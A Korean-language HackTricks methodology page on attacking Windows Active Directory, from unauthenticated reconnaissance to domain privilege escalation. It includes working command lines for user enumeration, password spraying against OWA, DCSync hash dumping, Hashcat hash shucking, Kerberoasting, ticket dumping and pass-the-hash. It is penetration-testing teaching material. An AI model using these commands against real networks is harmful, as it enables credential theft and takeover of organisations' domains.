# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## 기본 개요

**Active Directory**는 네트워크 관리자가 네트워크 내에서 **도메인**, **사용자**, **오브젝트**를 효율적으로 생성하고 관리할 수 있게 해주는 기본 기술입니다. 대규모로 확장되도록 설계되어 많은 수의 사용자를 관리 가능한 **그룹**과 **하위 그룹**으로 조직하고 다양한 수준에서의 **접근 권한**을 제어할 수 있습니다.

**Active Directory**의 구조는 세 가지 주요 계층으로 구성됩니다: **도메인**, **트리**, 그리고 **포리스트**. **도메인**은 공통 데이터베이스를 공유하는 **사용자**나 **장치** 같은 오브젝트들의 모음입니다. **트리**는 공통 구조로 연결된 도메인들의 그룹이며, **포리스트**는 여러 트리들이 **트러스트 관계(trust relationships)**를 통해 연결된 최상위 조직 구조입니다. 각 계층에서 특정 **접근** 및 **통신 권한**을 지정할 수 있습니다.

Active Directory 내 주요 개념은 다음과 같습니다:

1. **디렉터리(Directory)** – Active Directory 오브젝트와 관련된 모든 정보를 저장합니다.
2. **오브젝트(Object)** – 디렉터리 내의 엔터티로 **사용자**, **그룹**, 또는 **공유 폴더** 등을 포함합니다.
3. **도메인(Domain)** – 디렉터리 오브젝트의 컨테이너로, 여러 도메인이 하나의 **포리스트** 내에 공존할 수 있으며 각 도메인은 자체 오브젝트 컬렉션을 가집니다.
4. **트리(Tree)** – 공통 루트 도메인을 공유하는 도메인들의 그룹입니다.
5. **포리스트(Forest)** – Active Directory의 최상위 조직 구조로, 여러 트리와 이들 간의 **트러스트 관계**로 구성됩니다.

**Active Directory Domain Services (AD DS)**는 네트워크 내 중앙 집중식 관리와 통신을 위해 중요한 다양한 서비스를 포함합니다. 이들 서비스는 다음을 포함합니다:

1. **Domain Services** – 데이터 저장을 중앙화하고 **사용자**와 **도메인** 간의 상호작용(인증 및 검색 기능 포함)을 관리합니다.
2. **Certificate Services** – 보안 **디지털 인증서**의 생성, 배포 및 관리를 감독합니다.
3. **Lightweight Directory Services** – **LDAP protocol**을 통해 디렉터리 지원 애플리케이션을 지원합니다.
4. **Directory Federation Services** – 여러 웹 애플리케이션에 걸쳐 단일 세션으로 사용자를 인증하는 **single-sign-on** 기능을 제공합니다.
5. **Rights Management** – 저작권 자료의 무단 배포 및 사용을 규제하여 보호를 돕습니다.
6. **DNS Service** – **도메인 이름** 해석에 필수적입니다.

더 자세한 설명은 다음을 확인하세요: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

AD를 공격하려면 **Kerberos authentication process**를 정말 잘 이해해야 합니다.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## 치트 시트

AD를 열람/공격하기 위해 어떤 명령들을 실행할 수 있는지 빠르게 확인하려면 [https://wadcoms.github.io/](https://wadcoms.github.io)에서 많은 정보를 얻을 수 있습니다.

> [!WARNING]
> Kerberos 통신은 작업 수행을 위해 **full qualifid name (FQDN)**이 **필요합니다**. 만약 IP 주소로 머신에 접근하려 하면, **NTLM을 사용하게 되며 Kerberos를 사용하지 않습니다**.

## Recon Active Directory (자격증명/세션 없음)

AD 환경에 접근은 가능하지만 자격증명/세션이 없는 경우 할 수 있는 일:

- **네트워크 펜테스트:**
  - 네트워크를 스캔하고 머신과 열린 포트를 찾아 **취약점 악용** 또는 해당 시스템에서 **자격증명 추출**을 시도합니다 (예: [프린터는 매우 흥미로운 타깃이 될 수 있습니다](ad-information-in-printers.md)).
  - DNS 열람은 웹, 프린터, 공유, VPN, 미디어 등 도메인 내 핵심 서버에 대한 정보를 제공할 수 있습니다.
  - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - 자세한 방법은 일반 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)를 참조하세요.
- **SMB 서비스에서 null 및 Guest 접근 확인** (이 방법은 최신 Windows 버전에서는 동작하지 않을 수 있음):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - SMB 서버 열람에 대한 보다 상세한 가이드는 다음에서 확인할 수 있습니다:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP 열람**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - 익명 접근(anonymous access)에 **특별히 주의**하면서 LDAP 열람에 대한 자세한 가이드는 다음에서 확인하세요:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **네트워크 중간자 공격(Poison the network)**
  - Responder로 **서비스를 가장하여 자격증명 수집**(impersonating services with Responder) (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - [**리레이 공격을 악용하여 호스트에 접근**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - 가짜 UPnP 서비스를 노출하여 자격증명 수집(evil-S **SDP**) (../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) [**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - 내부 문서, 소셜 미디어, 도메인 내부의 서비스(주로 웹) 및 공개적으로 이용 가능한 정보에서 사용자 이름/이름을 추출합니다.
  - 회사 직원의 전체 이름을 찾으면 다양한 AD **username conventions**을 시도해 볼 수 있습니다 ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). 일반적인 규칙으로는: _NameSurname_, _Name.Surname_, _NamSur_ (각각 3글자), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3개의 _영문 문자 + 3개의 숫자_ (예: abc123) 등이 있습니다.
  - 도구:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 사용자 열거

- **익명 SMB/LDAP 열거:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 및 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 페이지를 확인하세요.
- **Kerbrute 열거:** 잘못된 사용자 이름이 요청되면 서버는 **Kerberos error** 코드 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_로 응답하여 사용자가 유효하지 않음을 알립니다. **유효한 사용자 이름**은 AS-REP에서 **TGT를 반환**하거나 _KRB5KDC_ERR_PREAUTH_REQUIRED_ 오류를 반환하여 해당 사용자가 사전 인증(pre-authentication)을 요구함을 나타냅니다.
- **MS-NRPC에 대한 인증 없음(No Authentication against MS-NRPC):** 도메인 컨트롤러의 MS-NRPC (Netlogon) 인터페이스에 auth-level = 1 (No authentication)로 바인딩하여 자격증명 없이도 사용자가 존재하는지 확인할 수 있습니다. 이 방법은 MS-NRPC 인터페이스를 바인딩한 후 `DsrGetDcNameEx2` 함수를 호출하여 사용자나 컴퓨터가 존재하는지 확인합니다. 이 유형의 열거를 구현한 도구는 [NauthNRPC](https://github.com/sud0Ru/NauthNRPC)입니다. 관련 연구는 [여기](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)에서 확인할 수 있습니다.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) 서버**

네트워크에서 이러한 서버를 발견했다면, 해당 서버에 대해 **user enumeration**도 수행할 수 있습니다. 예를 들어, [**MailSniper**](https://github.com/dafthack/MailSniper) 도구를 사용할 수 있습니다:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **회사에서 일하는 사람들의 이름** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **가지고 있지 않다면** the attribute _DONT_REQ_PREAUTH_ you can **AS_REP 메시지를 요청할 수 있습니다** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): 발견한 각 사용자에 대해 가장 **일반적인 비밀번호들**을 시도해 보세요. 아마도 어떤 사용자가 취약한 비밀번호를 쓰고 있을 수 있습니다(비밀번호 정책을 염두에 두세요!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

네트워크의 일부 프로토콜을 포이즈닝하여 크랙할 수 있는 챌린지 해시를 얻을 수 있습니다:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

active directory를 열거하는 데 성공하면 **더 많은 이메일과 네트워크에 대한 더 나은 이해**를 갖게 됩니다. NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)를 강제하여 AD 환경에 접근할 수 있을지도 모릅니다.

### Steal NTLM Creds

**null 또는 guest user**로 **다른 PC나 공유에 접근할 수 있다면** SCF 파일 같은 **파일을 배치**할 수 있고, 누군가가 그것에 접근하면 **당신을 대상으로 한 NTLM 인증을 트리거**하여 **NTLM 챌린지**를 훔쳐 크랙할 수 있습니다:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**은 이미 보유한 모든 NT 해시를 NT 해시로부터 직접 유래되는 키 재료를 사용하는 느린 포맷들(예: Kerberos RC4 티켓, NetNTLM 챌린지, 캐시된 자격증명)의 후보 비밀번호로 취급합니다. 긴 패스프레이즈를 Kerberos RC4 티켓, NetNTLM 응답 또는 캐시된 자격증명에서 무작위로 찾는 대신 NT 해시를 Hashcat의 NT-candidate 모드에 투입하여 평문을 알지 못한 채 재사용을 검증합니다. 이는 도메인 침해 이후 수천 개의 현재 및 과거 NT 해시를 수집할 수 있을 때 특히 강력합니다.

다음 상황에서 shucking을 사용하세요:

- DCSync, SAM/SECURITY 덤프 또는 자격증명 저장소에서 NT 코퍼스가 있어 다른 도메인/포레스트에서 재사용을 검사해야 할 때.
- RC4 기반 Kerberos 자료(`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM 응답 또는 DCC/DCC2 블랍을 캡처할 때.
- 긴, 크랙하기 힘든 패스프레이즈의 재사용을 빠르게 증명하고 바로 Pass-the-Hash로 피벗하려 할 때.

이 기법은 키가 NT 해시가 아닌 암호화 유형(예: Kerberos etype 17/18 AES)에는 작동하지 않습니다. 도메인이 AES 전용을 강제하면 일반 비밀번호 모드로 되돌아가야 합니다.

#### Building an NT hash corpus

- **DCSync/NTDS** – `secretsdump.py`를 히스토리 옵션과 함께 사용하여 가능한 한 많은 NT 해시(및 이전 값)를 확보하세요:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

히스토리 항목은 계정당 최대 24개의 이전 해시를 저장할 수 있기 때문에 후보 풀을 크게 넓힙니다. NTDS 비밀을 수집하는 더 많은 방법은 다음을 참조하세요:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (또는 Mimikatz `lsadump::sam /patch`)로 로컬 SAM/SECURITY 데이터와 캐시된 도메인 로그인(DCC/DCC2)을 추출합니다. 중복을 제거하고 해당 해시들을 같은 `nt_candidates.txt` 목록에 추가하세요.
- **메타데이터 추적** – 각 해시를 생성한 username/domain을 함께 보관하세요(워드리스트가 헥사만 포함하더라도). 일치하는 해시는 Hashcat이 승리 후보를 출력하는 즉시 어떤 주체가 비밀번호를 재사용하고 있는지 알려줍니다.
- shucking할 때는 같은 포레스트 또는 신뢰된 포레스트에서 가져온 후보를 우선 사용하세요; 재사용 가능성이 최대화됩니다.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate 입력은 **항상 로우 32-헥사 NT 해시**여야 합니다. 룰 엔진을 비활성화하세요( `-r` 금지, 하이브리드 모드 금지) — 맹글링은 후보 키 재료를 손상시킵니다.
- 이 모드들이 본질적으로 더 빠른 것은 아니지만, NTLM 키스페이스(예: M3 Max에서 ~30,000 MH/s)는 Kerberos RC4(~300 MH/s)보다 약 100× 빠릅니다. 엄선된 NT 리스트를 테스트하는 것이 느린 포맷에서 전체 비밀번호 공간을 탐색하는 것보다 훨씬 저렴합니다.
- 항상 최신 Hashcat 빌드(`git clone https://github.com/hashcat/hashcat && make install`)를 사용하세요. 모드 31500/31600/35300/35400은 최근에 추가되었습니다.
- 현재 AS-REQ Pre-Auth에 대한 NT 모드는 없으며, AES etypes(19600/19700)는 키가 UTF-16LE 비밀번호로부터 PBKDF2로 유도되므로 평문 비밀번호가 필요합니다(로우 NT 해시로부터 파생되지 않음).

#### Example – Kerberoast RC4 (mode 35300)

1. 저권한 사용자로 대상 SPN에 대한 RC4 TGS를 캡처하세요(자세한 내용은 Kerberoast 페이지 참조):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. NT 리스트로 티켓을 shuck하세요:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat은 각 NT 후보로부터 RC4 키를 유도하고 `$krb5tgs$23$...` 블랍을 검증합니다. 일치하면 서비스 계정이 기존 NT 해시들 중 하나를 사용하고 있음을 확인합니다.

3. 즉시 PtH로 피벗하세요:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

필요하다면 나중에 `hashcat -m 1000 <matched_hash> wordlists/`로 평문을 복구할 수도 있습니다.

#### Example – Cached credentials (mode 31600)

1. 침해된 워크스테이션에서 캐시된 로그인 정보를 덤프하세요:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 관심 있는 도메인 사용자의 DCC2 라인을 `dcc2_highpriv.txt`로 복사하고 shuck하세요:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 성공적인 매치는 이미 리스트에 있는 NT 해시를 반환하며, 캐시된 사용자가 비밀번호를 재사용하고 있음을 증명합니다. 이를 PtH(`nxc smb <dc_ip> -u highpriv -H <hash>`)에 직접 사용하거나 빠른 NTLM 모드로 오프라인에서 문자열을 브루트포스하세요.

동일한 워크플로우는 NetNTLM 챌린지-응답(`-m 27000/27100`)과 DCC(`-m 31500`)에도 적용됩니다. 일단 매치가 확인되면 relay, SMB/WMI/WinRM PtH를 실행하거나 오프라인에서 마스크/룰로 NT 해시를 재크랙할 수 있습니다.



## Enumerating Active Directory WITH credentials/session

이 단계에서는 유효한 도메인 계정의 자격증명이나 세션을 **탈취한 상태여야** 합니다. 일부 유효한 자격증명이나 도메인 사용자로서의 셸이 있다면, 앞서 언급한 옵션들(사용자들을 추가로 탈취하기 위한 방법들)은 여전히 사용 가능하다는 점을 기억하세요.

인증된 열거를 시작하기 전에 **Kerberos double hop 문제**가 무엇인지 이해해야 합니다.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

계정을 탈취한 것은 **도메인 전체를 탈취하기 위한 큰 발걸음**입니다. 이제 Active Directory 열거를 시작할 수 있기 때문입니다:

[**ASREPRoast**](asreproast.md)에 관해서는 이제 가능한 모든 취약 사용자를 찾을 수 있고, [**Password Spraying**](password-spraying.md)에 관해서는 **모든 사용자 이름 목록**을 얻어서 탈취한 계정의 비밀번호, 빈 비밀번호, 그리고 유망한 새 비밀번호들을 시도해볼 수 있습니다.

- 기본적인 정보를 수집하려면 [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)를 사용할 수 있습니다.
- 더 은밀하게 하려면 [**powershell for recon**](../basic-powershell-for-pentesters/index.html)을 사용하세요.
- 더 상세한 정보를 추출하려면 [**use powerview**](../basic-powershell-for-pentesters/powerview.md)를 사용할 수 있습니다.
- Active Directory 탐색에 놀라운 도구 중 하나는 [**BloodHound**](bloodhound.md)입니다. 수집 방법에 따라 **매우 은밀하지는 않지만**, 은밀성을 크게 신경 쓰지 않는다면 꼭 사용해보세요. 사용자가 RDP 가능한 곳, 그룹으로 가는 경로 등을 찾는 데 유용합니다.
- **다른 자동 AD 열거 도구들:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md)는 흥미로운 정보를 포함하고 있을 수 있습니다.
- GUI를 가진 디렉터리 열거 도구로는 **SysInternal** Suite의 **AdExplorer.exe**가 있습니다.
- **ldapsearch**를 사용해 LDAP 데이터베이스에서 _userPassword_ & _unixUserPassword_ 필드나 _Description_ 필드에 자격증명이 있는지 검색할 수도 있습니다. 다른 방법은 PayloadsAllTheThings의 "Password in AD User comment" 항목을 참조하세요: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment
- **Linux**를 사용 중이라면 [**pywerview**](https://github.com/the-useless-one/pywerview)로 도메인을 열거할 수도 있습니다.
- 다음과 같은 자동화 도구들도 시도해볼 수 있습니다:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **모든 도메인 사용자 추출**

Windows에서는 모든 도메인 사용자 이름을 얻는 것이 매우 쉽습니다(`net user /domain`, `Get-DomainUser` 또는 `wmic useraccount get name,sid`). Linux에서는 `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 또는 `enum4linux -a -u "user" -p "password" <DC IP>`를 사용할 수 있습니다.

> 이 Enumeration 섹션은 분량은 작아 보이지만 가장 중요한 부분입니다. 링크들(특히 cmd, powershell, powerview, BloodHound)을 방문해 도메인을 어떻게 열거하는지 배우고 충분히 연습하세요. 실제 평가에서는 이 순간이 DA로 가는 길을 찾거나 더 이상 진행할 수 없음을 판단하는 핵심 순간이 될 것입니다.

### Kerberoast

Kerberoasting은 사용자 계정에 연결된 서비스들이 사용하는 **TGS 티켓**을 획득하고, 그 암호화(사용자 비밀번호를 기반으로 함)를 오프라인에서 크랙하는 기법입니다.

자세한 내용은 다음을 참조하세요:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

자격증명을 얻으면 어떤 **머신**에 접근할 수 있는지 확인해 보세요. 포트 스캔 결과에 따라 여러 서버에서 다양한 프로토콜로 연결을 시도하려면 **CrackMapExec**를 사용할 수 있습니다.

### Local Privilege Escalation

일반 도메인 사용자로서 자격증명이나 세션을 탈취했고 도메인 내의 어떤 머신에 이 사용자의 계정으로 **접근 권한**이 있다면, 로컬 권한 상승을 시도하고 자격증명을 수집해야 합니다. 로컬 관리자 권한이 있어야 LSASS에서 다른 사용자의 해시를 메모리에서 덤프하거나 로컬(SAM)에서 덤프할 수 있기 때문입니다.

이 책에는 [**Windows의 로컬 권한 상승**](../windows-local-privilege-escalation/index.html)에 관한 전체 페이지와 [**체크리스트**](../checklist-windows-privilege-escalation.md)가 있습니다. 또한 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)를 잊지 말고 사용하세요.

### Current Session Tickets

현 사용자에게 의외의 리소스에 접근할 수 있는 권한을 주는 **티켓을 현재 세션에서 찾을 확률은 매우 낮지만**, 다음을 확인해 볼 수 있습니다:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

이제 기본적인 자격증명을 확보했으므로 AD 내부에서 **공유되고 있는 흥미로운 파일**이 있는지 확인해야 합니다. 수동으로 할 수 있긴 하지만 매우 지루하고 반복적인 작업이며(수백 개의 문서를 확인해야 한다면 더더욱 그렇습니다).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

다른 PC나 공유에 **접근할 수 있다면**, SCF 파일과 같은 파일을 **배치**하여 누군가 해당 파일에 접근했을 때 당신을 향한 **NTLM authentication**을 트리거하도록 만들 수 있고, 그렇게 해서 크랙할 수 있는 **NTLM challenge**를 **steal**할 수 있습니다:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

이 취약점은 인증된 사용자라면 누구나 **도메인 컨트롤러를 탈취(compromise the domain controller)**할 수 있게 허용했습니다.

{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopefully you have managed to **compromise some local admin** account using [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
그런 다음 메모리와 로컬에서 모든 해시를 덤프할 시간입니다.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
해당 **hash**를 사용하여 **NTLM authentication**을 수행하는 도구를 사용하거나, 새로운 **sessionlogon**을 생성해 그 **hash**를 **LSASS** 내에 주입하여 이후 이루어지는 모든 **NTLM authentication**에 그 **hash**가 사용되도록 할 수 있습니다. 후자는 mimikatz가 하는 방식입니다.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.

{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.

{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrato**r you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 이것은 상당히 **노이즈가 많으며**, **LAPS**가 이를 **완화**할 수 있다는 점에 유의하세요.

### MSSQL 오용 및 신뢰된 링크

사용자가 **MSSQL 인스턴스에 접근할 권한**이 있다면, MSSQL 호스트에서 **명령을 실행**(SA로 실행 중인 경우)하거나 NetNTLM **hash**를 **탈취**하거나 심지어 **relay attack**을 수행할 수 있습니다.\
또한, 한 MSSQL 인스턴스가 다른 MSSQL 인스턴스에 의해 신뢰(trusted, database link)되어 있다면, 사용자가 신뢰된 데이터베이스에 대한 권한을 가지고 있는 경우 **신뢰 관계를 이용해 다른 인스턴스에서도 쿼리를 실행할 수 있습니다**. 이러한 신뢰는 연쇄될 수 있으며, 결국 사용자가 명령을 실행할 수 있는 잘못 구성된 데이터베이스를 찾을 수도 있습니다.\
**데이터베이스 간 링크는 포리스트 신뢰(forest trusts) 간에도 작동합니다.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT 자산/배포 플랫폼 오용

타사 인벤토리 및 배포 솔루션은 종종 자격증명과 코드 실행으로 접근할 수 있는 강력한 경로를 노출합니다. 참고:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

만약 어떤 Computer 객체가 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 속성을 가지고 있고 그 컴퓨터에 대한 도메인 권한을 갖고 있다면, 해당 컴퓨터에 로그인하는 모든 사용자의 메모리에서 TGT를 덤프할 수 있습니다.\
따라서 **Domain Admin이 해당 컴퓨터에 로그인하면**, 그의 TGT를 덤프하여 [Pass the Ticket](pass-the-ticket.md)를 사용해 그를 가장할 수 있습니다.\
constrained delegation 덕분에 **Print Server를 자동으로 탈취할 수도 있습니다** (운이 좋으면 그것이 DC일 것입니다).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

사용자나 컴퓨터가 "Constrained Delegation"을 허용하면 해당 대상 컴퓨터의 일부 서비스에 대해 **임의의 사용자를 가장하여 접근**할 수 있습니다.\
따라서 이 사용자/컴퓨터의 **hash를 탈취하면**, 일부 서비스에 대해 **어떤 사용자든(심지어 domain admins 포함) 가장할 수 있습니다**.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

원격 컴퓨터의 Active Directory 객체에 대해 **WRITE** 권한을 보유하면 **승격된 권한으로 코드 실행**을 달성할 수 있습니다:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### 권한/ACL 오용

탈취된 사용자는 특정 도메인 객체에 대해 **흥미로운 권한을 가지고 있을 수 있으며**, 이를 통해 이후에 **측면 이동/권한 상승**이 가능해질 수 있습니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler 서비스 오용

도메인 내에서 **Spool 서비스가 리스닝 중인 것을 발견**하면 이는 **새 자격증명 획득** 및 **권한 상승**에 **악용될 수 있습니다**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### 제3자 세션 오용

**다른 사용자들이** **탈취된 머신에 접속하는 경우**, 메모리에서 **자격증명 수집** 및 심지어 **그들의 프로세스에 beacon 주입**을 통해 그들을 가장할 수 있습니다.\
대부분 사용자는 RDP로 시스템에 접속하므로, 제3자 RDP 세션에 대해 수행할 수 있는 몇 가지 공격 방법은 다음과 같습니다:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**는 도메인 가입 컴퓨터의 **로컬 Administrator 비밀번호**를 관리하는 시스템으로, 비밀번호를 **무작위화**, 고유화하고 자주 **변경**되도록 보장합니다. 이러한 비밀번호는 Active Directory에 저장되며 액세스는 ACL을 통해 허용된 사용자로만 제어됩니다. 이러한 비밀번호에 접근할 수 있는 충분한 권한이 있으면 다른 컴퓨터로 피벗하는 것이 가능합니다.


{{#ref}}
laps.md
{{#endref}}

### 인증서 탈취

탈취된 머신에서 **인증서 수집**은 환경 내에서 권한을 상승시키는 방법이 될 수 있습니다:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### 인증서 템플릿 오용

